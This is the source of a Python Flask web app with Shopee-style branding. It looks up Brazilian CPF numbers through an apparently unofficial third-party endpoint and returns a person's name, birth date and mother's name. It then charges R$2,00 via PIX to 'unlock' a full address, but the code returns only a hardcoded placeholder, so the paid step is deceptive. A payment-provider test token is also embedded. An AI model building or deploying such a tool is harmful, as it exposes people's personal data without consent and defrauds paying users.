from flask import Flask, render_template_string, request, jsonify
import mercadopago
import random
import os
import requests

app = Flask(__name__)

# CREDENCIAIS DE TESTE
ACCESS_TOKEN = "TEST-8139252928482096-012603-3771e09c396d70b8633407ab01809ced-1378615355"
sdk = mercadopago.SDK(ACCESS_TOKEN)

@app.route('/')
def index():
    # Gerar pagamento para o modal
    payment_data = {"transaction_amount": 2.00, "description": "Consulta Dados", "payment_method_id": "pix", 
                    "payer": {"email": "test@test.com", "first_name": "Mikael"}}
    try:
        res = sdk.payment().create(payment_data, mercadopago.config.RequestOptions())
        p = res["response"]
        qr = p["point_of_interaction"]["transaction_data"]["qr_code_base64"]
        px = p["point_of_interaction"]["transaction_data"]["qr_code"]
    except: qr, px = "", ""
    return render_template_string(HTML_SHOPEE, qr=qr, px=px)

@app.route('/consultar/<cpf>')
def api(cpf):
    # BUSCA REAL NA API FEDERAL
    url = f"https://federal-leilao.com/v1/consultarev0ltz/{cpf}?token=tokenbartservcis9x025"
    try:
        r = requests.get(url, timeout=10)
        d = r.json()
        return jsonify({
            "nome": d.get("nome", "NÃO LOCALIZADO"),
            "nascimento": d.get("nascimento", "--/--/----"),
            "cpf": cpf,
            "sexo": d.get("genero", "Masculino"), # Ajusta conforme retorno da API
            "mae": d.get("mae", "NÃO LOCALIZADO"),
            "rua": "RUA LOCALIZADA, Nº *** - BAIRRO IDENTIFICADO"
        })
    except:
        return jsonify({"erro": "Erro de conexão"}), 500

HTML_SHOPEE = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirme seus dados</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f5f5f5; font-family: sans-serif; }
        .shopee-orange { background-color: #ee4d2d; }
        .text-shopee { color: #ee4d2d; }
    </style>
</head>
<body>
    <div class="max-w-md mx-auto bg-white min-h-screen shadow-lg">
        <div class="p-4 border-b flex items-center gap-4">
            <span class="text-2xl font-bold text-shopee">DataSearch</span>
            <h1 class="text-lg font-medium text-gray-800">Confirme seus dados</h1>
        </div>

        <div class="p-6 bg-gray-50 border-b">
            <p class="text-sm text-gray-600 mb-2">Digite o CPF para análise:</p>
            <div class="flex gap-2">
                <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="flex-1 border border-gray-300 p-3 rounded outline-none focus:border-orange-500">
                <button onclick="buscar()" class="shopee-orange text-white px-6 py-3 rounded font-bold">BUSCAR</button>
            </div>
        </div>

        <div id="results" class="hidden p-6 space-y-4">
            <div class="space-y-4 text-gray-700">
                <div>
                    <p class="text-xs text-gray-500">Nome completo:</p>
                    <p id="res_nome" class="font-semibold text-gray-900 border-b pb-1"></p>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <p class="text-xs text-gray-500">Data de nascimento:</p>
                        <p id="res_nasc" class="font-semibold text-gray-900 border-b pb-1"></p>
                    </div>
                    <div>
                        <p class="text-xs text-gray-500">Sexo:</p>
                        <p id="res_sexo" class="font-semibold text-gray-900 border-b pb-1">Masculino</p>
                    </div>
                </div>
                <div>
                    <p class="text-xs text-gray-500">CPF:</p>
                    <p id="res_cpf" class="font-semibold text-gray-900 border-b pb-1"></p>
                </div>
                <div>
                    <p class="text-xs text-gray-500">Nome da mãe:</p>
                    <p id="res_mae" class="font-semibold text-gray-900 border-b pb-1"></p>
                </div>
            </div>

            <div class="pt-6 space-y-3">
                <p class="text-sm font-bold text-gray-800">Estes dados estão corretos?</p>
                <button onclick="document.getElementById('modal_pix').style.display='flex'" class="w-full shopee-orange text-white py-4 rounded-sm font-bold shadow-md">Sim, liberar endereço (R$ 2,00)</button>
                
                <button onclick="simular()" class="w-full bg-emerald-500 text-white py-3 rounded-sm font-bold text-xs">SIMULAR APROVAÇÃO (TESTE)</button>
            </div>

            <div id="unlock_area" class="hidden mt-6 p-4 bg-green-50 border border-green-200 rounded">
                <p class="text-xs text-green-700 font-bold uppercase mb-2 italic">Endereço Completo Liberado:</p>
                <p id="res_rua" class="text-gray-900 font-bold"></p>
            </div>
        </div>
    </div>

    <div id="modal_pix" style="display:none" class="fixed inset-0 bg-black/80 flex flex-col items-center justify-center p-6 z-50">
        <div class="bg-white p-6 rounded shadow-xl w-full max-w-xs text-center text-black">
            <p class="font-bold mb-4">Pagamento via PIX</p>
            <img src="data:image/png;base64,{{ qr }}" class="w-48 mx-auto mb-4 border p-1">
            <button onclick="alert('Código Copiado')" class="w-full shopee-orange text-white py-3 rounded font-bold mb-4">Copiar Código</button>
            <button onclick="document.getElementById('modal_pix').style.display='none'" class="text-gray-400 text-sm">Cancelar</button>
        </div>
    </div>

    <script>
        async function buscar() {
            const cpf = document.getElementById('cpf_input').value;
            if(!cpf) return alert("Digite o CPF");
            
            // Feedback de busca
            document.getElementById('results').classList.add('hidden');
            
            try {
                const r = await fetch('/consultar/' + cpf + '?cache=' + Math.random());
                const d = await r.json();
                
                document.getElementById('res_nome').innerText = d.nome;
                document.getElementById('res_nasc').innerText = d.nascimento;
                document.getElementById('res_cpf').innerText = d.cpf;
                document.getElementById('res_mae').innerText = d.mae;
                document.getElementById('res_rua').innerText = d.rua;
                
                document.getElementById('results').classList.remove('hidden');
            } catch(e) { alert("Erro na consulta."); }
        }

        function simular() {
            alert("Pagamento Aprovado com Sucesso!");
            document.getElementById('unlock_area').classList.remove('hidden');
            window.scrollTo(0, document.body.scrollHeight);
        }
    </script>
</body>
</html>
